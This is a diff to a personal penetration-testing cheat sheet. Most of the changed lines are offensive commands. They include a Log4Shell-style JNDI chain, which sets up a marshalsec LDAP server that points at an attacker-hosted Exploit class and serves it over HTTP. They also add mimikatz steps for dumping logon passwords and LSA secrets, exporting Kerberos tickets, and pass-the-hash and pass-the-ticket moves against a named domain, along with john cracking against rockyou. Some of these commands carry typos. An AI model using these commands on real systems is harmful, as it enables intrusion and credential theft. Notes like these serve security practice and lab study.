@@ -25,7 +25,8 @@ openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
 sudo ifconfig en0 ether  <MAC address>
 
 # Kali terminal setup (podman, docker)
-apt install proxychains4 nmap sqlmap links neovim tor curl golang fish
+apt install proxychains4 nmap metasploit-framework sqlmap links neovim tor curl golang fish
+tor &
 proxychains4 -q fish
 curl https://www.get-my-ip.info/api/ip
 
@@ -65,6 +66,25 @@ pylint = {enabled = true}
 yapf = {enabled = true}
 ruff = { enabled = true}
 
+# Linux User Rights (linux, user, rights):
+Owner - Group - Other
+rwx     rwx     rwx 
+
+r = read = 4
+w = write = 2
+x = execute = 1
+== 7
+
+r = read = 4
+w = write = 2
+x = execute = 0
+== 6
+
+r = read = 4
+w = write = 0
+x = execute = 1
+== 5
+
 # ENCODING (encoding, enc)
 string to base64
 echo -n "string" | base64
@@ -82,7 +102,7 @@ Example Hash Inputs:
 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8	SHA256
 $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy	    BCRYPT
 $1$Pl3m5Y95$t3Nk4zEXTCXDP4Vs4cL0p0	                                MD5-Crypt
-If a hash has dollar signs “$” in it, this is usually a delimiter between the salt and the hash.
+If a hash has dollar signs "$" in it, this is usually a delimiter between the salt and the hash.
 Source: https://www.tunnelsup.com/hash-analyzer/
 
 # leak search (leak, grep)
@@ -497,8 +517,6 @@ db.dbname.find()
 Install and start LDAP server that redirects to your exploit class:
 https://github.com/mbechler/marshalsec
 
-apt install openjdk-21-jdk maven
-
 git clone https://github.com/mbechler/marshalsec.git
 mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP:8000/#Exploit"
@@ -516,7 +534,7 @@ public class Exploit {
 }
 
 Compile exploit to Javacode:
-javac Exploit.java --release 8
+javac Exploit.java
 
 Host Javacode with python:
 python3 -m http.server
@@ -676,9 +694,11 @@ sekurlsa::logonPasswords
 
 # MIMIKATZ
 In mimikatz:
-privilege::debug = 20?
+privilege::debug
 token:elevate
+sekurlsa::logonpasswords
 lsadump::sam
+lsadump::lsa /inject
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT thomas.hash
 john hashes.txt -wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
@@ -690,6 +710,11 @@ crunch 1 6 abcdefg
 
 Export ticket:
 sekurlsa::tickets /export
+kerberos:ppt [0;3e7]-0-2-40a50000-SE-SEC-WIN10$@LDAP-SE-SEC-DC01.se-sec.local.kirbi
+
+sekurlsa::pth /user:admin /domain:se-sec.local /ntlm:<hash>
+sekurlsa::pth /user:admin /domain:se-sec.local /ntlm:<hash> /impersonate
+token::list /user:admin
 
 Pass the ticket:
 In mimikatz:
